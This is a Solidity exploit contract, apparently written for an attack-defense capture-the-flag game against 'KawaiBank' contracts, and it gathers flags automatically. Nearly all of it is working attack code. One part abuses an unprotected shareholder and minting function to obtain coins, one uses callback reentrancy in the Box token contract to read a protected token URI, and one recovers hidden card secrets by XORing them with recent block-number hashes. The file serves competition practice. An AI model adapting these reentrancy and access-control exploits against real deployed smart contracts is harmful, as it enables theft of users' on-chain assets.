// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import "../kawaibank/KawaiBank.sol";
import "../box/Box.sol";
import "../coin/Coin.sol";
import "../card/Card.sol";
import "./IExploit.sol";

contract Exploit is IExploit {
    // don't change
    constructor() {
        _disableInitializers();
    }

    // don't change
    function init(address _owner) external override initializer {}

    // don't change
    struct BoxAttackData {
        address kawaiBank;
        uint256 tokenId;
    }

    // don't change
    struct CoinAttackData {
        address kawaiBank;
        uint256 itemId;
    }

    // don't change
    struct CardAttackData {
        address kawaiBank;
        uint256 cardId;
        uint256 signId;
    }

    // don't change
    BoxAttackData[] private boxAttackData;
    CoinAttackData[] private coinAttackData;
    CardAttackData[] private cardAttackData;

    // don't change
    function addBoxAttackData(BoxAttackData calldata ad) external {
        boxAttackData.push(ad);
    }

    // don't change
    function addCoinAttackData(CoinAttackData calldata ad) external {
        coinAttackData.push(ad);
    }

    // don't change
    function addCardAttackData(CardAttackData calldata ad) external {
        cardAttackData.push(ad);
    }

    // don't change
    string[] private boxFlags;
    string[] private coinFlags;
    string[] private cardFlags;
    mapping(string => bool) seenFlags;

    // don't change signature
    function checkPassword(bytes calldata password) internal pure {
        // place your password check here
        require(keccak256(password) == keccak256("amogus"));
    }

    // your changes go here
    function getBoxFlags(bytes calldata password, uint256 startIndex)
        external
        view
        returns (string[] memory)
    {
        checkPassword(password);
        require(startIndex <= boxFlags.length);
        uint256 r = boxFlags.length;
        if (startIndex + 100 <= boxFlags.length) {
            r = startIndex + 100;
        }
        string[] memory res = new string[](r - startIndex);
        for (uint256 i = startIndex; i < r; i++) {
            res[i - startIndex] = boxFlags[i];
        }
        return res;
    }

    // your changes go here
    function getCoinFlags(bytes calldata password, uint256 startIndex)
        external
        view
        returns (string[] memory)
    {
        checkPassword(password);
        require(startIndex <= coinFlags.length);
        uint256 r = coinFlags.length;
        if (startIndex + 100 <= coinFlags.length) {
            r = startIndex + 100;
        }
        string[] memory res = new string[](r - startIndex);
        for (uint256 i = startIndex; i < r; i++) {
            res[i - startIndex] = coinFlags[i];
        }
        return res;
    }

    // your changes go here
    function getCardFlags(bytes calldata password, uint256 startIndex)
        external
        view
        returns (string[] memory)
    {
        checkPassword(password);
        require(startIndex <= cardFlags.length);
        uint256 r = cardFlags.length;
        if (startIndex + 100 <= cardFlags.length) {
            r = startIndex + 100;
        }
        string[] memory res = new string[](r - startIndex);
        for (uint256 i = startIndex; i < r; i++) {
            res[i - startIndex] = cardFlags[i];
        }
        return res;
    }

    // don't change signature
    function exploit() external {
        if (boxAttackData.length > 0) {
            uint256 l = 0;
            if (boxAttackData.length >= 20) {
                l = boxAttackData.length - 20;
            }
            for (uint256 i = l; i < boxAttackData.length; i++) {
                exploitBox(boxAttackData[i]);
            }
        }

        if (coinAttackData.length > 0) {
            uint256 l = 0;
            if (coinAttackData.length >= 20) {
                l = coinAttackData.length - 20;
            }
            for (uint256 i = l; i < coinAttackData.length; i++) {
                exploitCoin(coinAttackData[i]);
            }
        }

        if (cardAttackData.length > 0) {
            uint256 l = 0;
            if (cardAttackData.length >= 20) {
                l = cardAttackData.length - 20;
            }
            for (uint256 i = l; i < cardAttackData.length; i++) {
                exploitCard(cardAttackData[i]);
            }
        }
    }

    // your changes go here
    function pushBoxFlag(string memory flag) internal {
        if (seenFlags[flag]) {
            return;
        }
        seenFlags[flag] = true;
        boxFlags.push(flag);
    }

    // your changes go here
    function pushCoinFlag(string memory flag) internal {
        if (seenFlags[flag]) {
            return;
        }
        seenFlags[flag] = true;
        coinFlags.push(flag);
    }

    // your changes go here
    function pushCardFlag(string memory flag) internal {
        if (seenFlags[flag]) {
            return;
        }
        seenFlags[flag] = true;
        cardFlags.push(flag);
    }

    // your changes go here
    // call pushBoxFlag
    function exploitBox(BoxAttackData memory ad) internal {
        BoxOwnerExploit boxOwnerExploit = new BoxOwnerExploit(
            KawaiBank(ad.kawaiBank),
            ad.tokenId
        );
        boxOwnerExploit.execute();
        pushBoxFlag(boxOwnerExploit.token());
    }

    // your changes go here
    // call pushCoinFlag
    function exploitCoin(CoinAttackData memory ad) internal {
        CoinBuyer coinBuyer = new CoinBuyer(KawaiBank(ad.kawaiBank), ad.itemId);
        pushCoinFlag(coinBuyer.item());
    }

    // your changes go here
    // call pushCardFlag
    function exploitCard(CardAttackData memory ad) internal {
        Card card = Card(address(KawaiBank(ad.kawaiBank).card()));
        bytes32 sign = card.signs(ad.cardId, ad.signId);
        uint256 l = 0;
        if (block.number >= 100) {
            l = block.number - 100;
        }
        for (uint256 blk = l; blk <= block.number; blk++) {
            bytes32 flag = "";
            assembly {
                mstore(0x00, blk)
                flag := xor(keccak256(0x00, 0x20), sign)
            }
            if (isCorrectFlag(flag)) {
                pushCardFlag(bytes32ToString(flag));
            }
        }
    }

    function bytes32ToString(bytes32 _bytes32)
        internal
        pure
        returns (string memory)
    {
        uint8 i = 0;
        while (i < 32 && _bytes32[i] != 0) {
            i++;
        }
        bytes memory bytesArray = new bytes(i);
        for (i = 0; i < 32 && _bytes32[i] != 0; i++) {
            bytesArray[i] = _bytes32[i];
        }
        return string(bytesArray);
    }

    function isCorrectFlag(bytes32 flag) internal pure returns (bool) {
        for (uint256 i; i < 31; i++) {
            if (
                !((flag[i] >= "0" && flag[i] <= "9") ||
                    (flag[i] >= "A" && flag[i] <= "Z"))
            ) {
                return false;
            }
        }
        return flag[31] == "=";
    }
}

contract CoinBuyer {
    string public item;

    constructor(KawaiBank kawaiBank, uint256 itemId) {
        Coin coin = Coin(address(kawaiBank.coin()));
        coin.setShareholder(address(this));
        coin.getCoins(1e18);
        coin.approve(address(this), 1e18);
        coin.buyItem(itemId);
        item = coin.viewItem(itemId);
    }
}

contract BoxOwnerExploit {
    uint256 private tokenId;
    Box private box;
    uint256 private boxExterminatedEnter;
    uint256 private boxMaterializedEnter;
    string public token;

    constructor(KawaiBank kawaiBank, uint256 _tokenId) {
        tokenId = _tokenId;
        box = Box(address(kawaiBank.box()));
    }

    function execute() external {
        box.clearTokenApprovals(tokenId);
    }

    function boxExterminated(uint256, bytes calldata) external {
        if (boxExterminatedEnter == 0) {
            boxExterminatedEnter = 1;
            box.mint(tokenId, "", "");
        }
    }

    function boxMaterialized(uint256, bytes calldata) external {
        if (boxMaterializedEnter == 0) {
            boxMaterializedEnter = 1;
            token = box.tokenURI(tokenId);
        }
    }
}
